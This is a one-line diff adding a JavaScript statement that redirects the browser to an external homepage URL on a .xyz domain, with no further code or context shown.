@@ -1,0 +1,1 @@
+window.location.replace("https://homepage.25122004.xyz/");
